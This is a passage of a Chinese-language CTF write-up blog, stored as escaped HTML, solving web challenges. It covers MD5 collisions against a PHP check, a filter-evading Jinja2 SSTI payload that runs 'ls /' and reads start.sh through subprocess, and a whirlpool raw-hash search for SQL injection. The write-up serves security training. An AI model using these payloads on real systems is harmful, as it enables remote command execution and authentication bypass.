%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A&amp;val7&#x3D;%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A&amp;a&#x3D;byGcY&amp;b&#x3D;aOtm2</span><br></pre></td></tr></table></figure>\n\n<p>即可拿到flag</p>\n<p><a href=\"[http://www.gtfly.top/2019/04/07/%E6%8E%98%E5%AE%89%E6%9D%AFwp.html#audit](http://www.gtfly.top/2019/04/07/掘安杯wp.html#audit)\">参考链接</a></p>\n<h1 id=\"easyflask1\"><a href=\"#easyflask1\" class=\"headerlink\" title=\"easyflask1\"></a>easyflask1</h1><p>给出提示，应该是ssti</p>\n<p>在404页面注入</p>\n<p><img src=\"/pic/123.png\" alt=\"\"></p>\n<p>经过测试过滤了<code>-</code>,<code>.</code>。</p>\n<p>参考链接<a href=\"https://fireshellsecurity.team/asisctf-fort-knox\" target=\"_blank\" rel=\"noopener\">https://fireshellsecurity.team/asisctf-fort-knox</a></p>\n<p>操作</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#39;&#39;.__class__.__mro__[1].__subclasses__()[&#39;&#39;&#39;找到warnings.catch_warnings&#39;&#39;&#39;].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;subprocess&#39;).check_output(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>\n\n<p>114师傅的payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">##payload不需要这么长，可以连续格式化字符串，也可以只把_和.用格式化字符串替代</span><br><span class=\"line\">#没找到flag，先看目录，发现start.sh可读</span><br><span class=\"line\">&#123;&#123;&#39;&#39;[&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](99)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;mro&#39;]()[1][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](117)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](99)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](101)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)]()[65][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](110)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](103)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](111)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](117)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](110)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](109)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](112)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](111)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](114)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)](&#39;subprocess&#39;)[&#39;check&#39;+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;output&#39;]([&#39;ls&#39;,&#39;&#x2F;&#39;])&#125;&#125;</span><br><span class=\"line\">#读取start.sh中存在sed -i &quot;s&#x2F;1ad0633b78d14695b04f105c14674b0d4&#x2F;$1&#x2F;g&quot; &#x2F;flag\\n</span><br><span class=\"line\">&#123;&#123;&#39;&#39;[&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](99)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;mro&#39;]()[1][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](117)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](99)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](101)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)]()[231][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](110)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](103)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](111)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](117)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](110)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](109)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](112)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](111)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](114)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)](&#39;subprocess&#39;)[&#39;check&#39;+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;output&#39;]([&#39;cat&#39;,&#39;&#x2F;start&#39;+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](46)+&#39;sh&#39;])&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"HashIsTrue\"><a href=\"#HashIsTrue\" class=\"headerlink\" title=\"HashIsTrue\"></a>HashIsTrue</h1><p>给了提示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">注意如下题目内容：$pw &#x3D; hash(&quot;whirlpool&quot;,$pass,true); $sql &#x3D; &quot;select * from user where username&#x3D;&#39;$user&#39; and password&#x3D;&#39;$pw&#39;&quot;;</span><br></pre></td></tr></table></figure>\n\n<p> hash(“whirlpool”,$pass,true)当hash函数开启true时，会返回字符串，而不是16进制。</p>\n<p>可以制造MD5后的包含‘= ’ (没有想通)</p>\n<p>编写脚本参考着114师傅</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">for($i&#x3D;0;;$i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $pass&#x3D;$i;</span><br><span class=\"line\">    $pw &#x3D; hash(&quot;whirlpool&quot;,$pass,true);</span><br><span class=\"line\">    if(preg_match(&#39;&#x2F;\\&#39;&#x3D;\\&#39;&#x2F;&#39;,$pw ))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        echo $i;</span><br><span class=\"line\">        echo urldecode(&#39;%09&#39;);</span><br><span class=\"line\">        echo $pw;</span><br><span class=\"line\">        echo urldecode(&#39;%0a&#39;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<h1 id=\"easy-hash\"><a href=\"#easy-hash\" class=\"headerlink\" title=\"easy-hash\"></a>easy-hash</h1><p>打开题目就是源码</p>","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$val1 &#x3D; @$_GET[&#39;val1&#39;];</span><br><span class=\"line\">$val2 &#x3D; @$_GET[&#39;val2&#39;];</span><br><span class=\"line\">$val3 &#x3D; @$_GET[&#39;val3&#39;];</span><br><span class=\"line\">$val4 &#x3D; @$_GET[&#39;val4&#39;];</span><br><span class=\"line\">$val5 &#x3D; (string)@$_POST[&#39;val5&#39;];</span><br><span class=\"line\">$val6 &#x3D; (string)@$_POST[&#39;val6&#39;];</span><br><span class=\"line\">$val7 &#x3D; (string)@$_POST[&#39;val7&#39;];</span><br><span class=\"line\">if( $val1 &#x3D;&#x3D; $val2 )&#123;</span><br><span class=\"line\">    die(&#39;val1 OR val2 no no no&#39;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if( md5($val1) !&#x3D; md5($val2) )&#123;</span><br><span class=\"line\">    die(&#39;step 1 fail&#39;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if( $val3 &#x3D;&#x3D; $val4 )&#123;</span><br><span class=\"line\">    die(&#39;val3 OR val4 no no no&#39;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if ( md5($val3) !&#x3D;&#x3D; md5($val4))&#123;</span><br><span class=\"line\">    die(&#39;step 2 fail&#39;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if( $val5 &#x3D;&#x3D; $val6 || $val5 &#x3D;&#x3D; $val7 || $val6 &#x3D;&#x3D; $val7 )&#123;</span><br><span class=\"line\">    die(&#39;val5 OR val6 OR val7 no no no&#39;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if (md5($val5) !&#x3D;&#x3D; md5($val6) || md5($val6) !&#x3D;&#x3D; md5($val7) || md5($val5) !&#x3D;&#x3D; md5($val7))&#123;</span><br><span class=\"line\">    die(&#39;step 3 fail&#39;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if(!($_POST[&#39;a&#39;]) and !($_POST[&#39;b&#39;]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    echo &quot;come on!&quot;;</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a &#x3D; $_POST[&#39;a&#39;];</span><br><span class=\"line\">$b &#x3D; $_POST[&#39;b&#39;];</span><br><span class=\"line\">$m &#x3D; $_GET[&#39;m&#39;];</span><br><span class=\"line\">$n &#x3D; $_GET[&#39;n&#39;];</span><br><span class=\"line\"></span><br><span class=\"line\">if (!(ctype_alnum($a)) || (strlen($a) &gt; 5)  || !(ctype_alnum($b)) || (strlen($b) &gt; 6))    &#x2F;&#x2F;&#x2F;&#x2F;判断是否是字母和数字或字母数字的组合</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    echo &quot;a OR b fail!&quot;;</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if ((strlen($m) &gt; 1) || (strlen($n) &gt; 1))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    echo &quot;m OR n fail&quot;;</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$val8 &#x3D; md5($a);</span><br><span class=\"line\">$val9 &#x3D; strtr(md5($b), $m, $n);  &#x2F;&#x2F;将MD5后包含$m的内容替换为$n</span><br><span class=\"line\"></span><br><span class=\"line\">echo PHP_EOL;</span><br><span class=\"line\">echo &quot;&lt;p&gt;val8 : $val8&lt;&#x2F;p&gt;&quot;;</span><br><span class=\"line\">echo PHP_EOL;</span><br><span class=\"line\">echo &quot;&lt;p&gt;val9 : $val9&lt;&#x2F;p&gt;&quot;;</span><br><span class=\"line\">echo PHP_EOL;</span><br><span class=\"line\">if (($val8 &#x3D;&#x3D; $val9) &amp;&amp; !($a &#x3D;&#x3D;&#x3D; $b) &amp;&amp; (strlen($b) &#x3D;&#x3D;&#x3D; 5))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    echo &quot;nice,good job,give you flag:&quot;;</span><br><span class=\"line\">    echo file_get_contents(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#39;);</span><br><span class=\"line\">&#125; val1 OR val2 no no no</span><br></pre></td></tr></table></figure>\n\n<p>显然的MD5碰撞</p>\n<p>生成的四组不同字符相同MD5</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A</span><br><span class=\"line\"></span><br><span class=\"line\">%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A</span><br><span class=\"line\"></span><br><span class=\"line\">%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A</span><br><span class=\"line\"></span><br><span class=\"line\">%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A</span><br></pre></td></tr></table></figure>\n\n<p>发包</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST &#x2F;?val1&#x3D;s878926199a&amp;val2&#x3D;s155964671a&amp;val3&#x3D;%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%1A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%6E%D0%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%09%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%96%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%F5%51%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%E0%C1%24%A3%03&amp;val4&#x3D;%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%9A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%EE%CF%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%89%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%16%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%75%52%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%60%C1%24%A3%03&amp;